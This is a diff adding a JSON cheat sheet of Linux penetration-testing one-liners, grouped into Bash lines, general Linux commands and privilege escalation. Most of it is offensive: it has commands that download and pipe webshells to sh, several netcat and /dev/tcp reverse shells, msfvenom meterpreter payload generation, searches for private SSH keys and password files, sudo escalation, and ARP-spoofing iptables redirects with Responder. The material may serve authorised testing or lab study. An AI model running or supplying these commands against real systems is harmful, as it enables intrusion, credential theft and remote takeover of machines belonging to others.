@@ -1,0 +1,74 @@
+{
+   "1": {
+     "name": "Bash Lines",
+     "data": {
+       "Current Dir if non given": "${1:-.}",
+       "Eliminate Line Duplications": "cat file.txt | sort --unique > 1 && cat 1 > file.txt && rm 1",
+       "While: Brute-Force": "while read -r line; do echo '${line}' >> output.txt; curl -iv 'http://$RHOST/${line}' >> output.txt; done < domain_list.txt ",
+       "For: Sequence": "for index in {1..10}; do touch file${index}; done",
+       "For: Brute-Force": "for sub in $(cat subs.txt); do host '$sub.$DOMAIN'; done"
+     }
+   },
+  "2": {
+    "name": "Linux: General",
+    "data": {
+      "Sudo Last Command": "sudo !!",
+      "System Info": "uname -a",
+      "Current Process Snapshot": "ps -ef",
+      "HTTP: Download Files #1" : "bash -c \"exec 3<>/dev/tcp/$RHOST/$RPORT; echo -e 'GET /webshell.sh HTTP/1.1\\r\\nHost: $LHOST:$LPORT\\r\\nConnection: close\\r\\n\\r\\n' >&3; cat <&3 > yourfile.sh\"",
+      "wget: Download Files #1" : "wget 'http://$RHOST:RPORT/$PATH/webshell.php'",
+      "curl: Download Files #1" : "curl 'http://$RHOST:RPORT/$PATH/webshell.php' -o webshell.php",
+      "curl: Download & Run #1" : "curl 'http://$RHOST:RPORT/$PATH/webshell.php' | sh",
+      "scp: Download File #1": "scp shell.elf '$USERNAME@$RHOST:$PATH'",
+      "scp: Download File #2": "scp -oHostkeyAlgorithms=+ssh-rsa '$USERNAME@$RHOST:/$PATH'",
+      "SSH: Dynamic Port Forwarding": "ssh -D $RHOST:$RPORT '$USERNAME@$RHOST'",
+      "Network: Netstat": "netstat -an",
+      "Network: List Network Interfaces": "ip a",
+      "Network: Ping host": "ping -c 3 $RHOST",
+      "Network: Fix MTU": "sudo ip link set tun0 mtu 1300",
+      "Mount: List Mounted Filesystems": "mount",
+      "Mount: NFS File Mount": "mount -t nfs $RHOST:$PATH /tmp/mount/ -nolock",
+      "Mount: NFS List Mounted Filesystems": "/usr/sbin/showmount -e $RHOST",
+      "Compile File": "gcc -fPIC -shared -nostartfiles -o /tmp/preload.so preload.c"
+    }
+  },
+  "3": {
+    "name": "Linux: Privilege Escalation",
+    "data": {
+      "Get Full TTY" : "script /dev/null -qc /bin/bash",
+      "Sudo #1": "sudo -l",
+      "Sudo #2": "sudo su",
+      "Sudo #3": "sudo -s",
+      "Sudo #4": "sudo /bin/bash",
+      "Sudo #5": "sudo /bin/sh",
+      "Sudo #6": "sudo passwd",
+      "Run shell with identity": "/bin/bash -p",
+      "/etc/passwd": "awk -F: '($3 == \"0\") {print}' /etc/passwd",
+      "Check Group Membership": "net group $GROUP /$DOMAIN",
+      "Installed Programing Languages": "dpkg -l | grep -E \"\\s(python|perl|ruby|java|gcc|g++|golang|nodejs|php|r-base|rust)\"",
+      "MSFVenom": "msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=$LHOST LPORT=$LPORT -f elf > rev_shell.elf",
+      "Environment Variables": "(env || set) 2>/dev/null",
+      "Read & Execute": "while IFS= read -r line; do echo \"$line\"; done < your_file.txt",
+      "Find: SSH Keys": "find / -type f -size +1k -size -5k -readable -exec grep -l 'PRIVATE KEY' {} \\; 2>/dev/null",
+      "Find: Files contain \"password\"": "find / -type f -exec grep '*password*' {} + 2> /dev/null &",
+      "Find: writeable files": "find / -writable -type  f 2>/dev/null | grep -v \"/proc/\"",
+      "Find: Files, from  specific date and outside of default paths": "find / -path /proc -prune -o -path /sys -prune -o -path /dev -prune -o -path /run -prune -o -path /tmp -prune -o -path /var/cache -prune -o -path /var/tmp -prune -o -newermt 2024-06-19 -type f 2>/dev/null",
+      "Find: SUIDs & GUIDs": "find / -type f -a \\( -perm -u+s -o -perm -g+s \\) -exec ls -l {} \\; 2> /dev/null",
+      "SUID & GUID of User #1": "cat '/proc/$USERNAME/status' | grep [GU]id",
+      "SUID & GUID of User #2": "find / -user '$USERNAME' -perm 4000 -exec bash -c 'ls -ldb \"$0\"' {} \\; 2>/dev/null",
+      "Binary Exploit: Step #1": "strace /usr/local/bin/suid-so 2>&1 | grep -iE \"open|access|no such file\"",
+      "Binary Exploit: Step #2": "strings /path/to/binary | grep -iE \"key|token|api|secret|apikey\"\n",
+      "Network: Enumeration #1": "netstat -anutop",
+      "Network: Enumeration #2": "tcpdump ip proto \\\\icmp -i tun0",
+      "Network: View IP Tables": "iptables -t nat -L -v -n",
+      "MITM: Arp Spoof Step #1": "iptables -t nat -A PREROUTING -p TCP -j DNAT --to-destination $RHOST",
+      "MITM: Arp Spoof Step #2": "iptables -t nat -A POSTROUTING -j MASQUERADE",
+      "MITM: Responder": "responder -I $NIC -b",
+      "Netcat: Listener": "nc -nlvp $LPORT",
+      "Netcat: Target": "nc $RHOST $RPORT",
+      "Reverse Shell: mkfifo #1": "mkfifo /tmp/f; nc -lvnp $LPORT < /tmp/f | /bin/sh >/tmp/f 2>&1; rm /tmp/f &",
+      "Reverse Shell: mkfifo #2": "mkfifo /tmp/f; nc $RHOST $RPORT < /tmp/f | /bin/sh >/tmp/f 2>&1; rm /tmp/f &",
+      "Reverse Shell: Mordechy": "bash -i >& /dev/tcp/$RHOST/$RPORT 0>&1 &"
+    }
+  }
+}
